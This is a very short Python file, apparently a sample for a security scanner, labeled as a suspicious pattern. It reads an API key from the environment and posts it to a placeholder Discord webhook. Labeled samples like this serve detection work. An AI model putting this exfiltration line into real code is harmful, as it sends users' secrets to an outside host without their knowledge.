"""Suspicious pattern: secret posted to a webhook-style host."""

import os
import requests

secret = os.environ["API_KEY"]
requests.post("https://discord.com/api/webhooks/123/placeholder", data=secret)
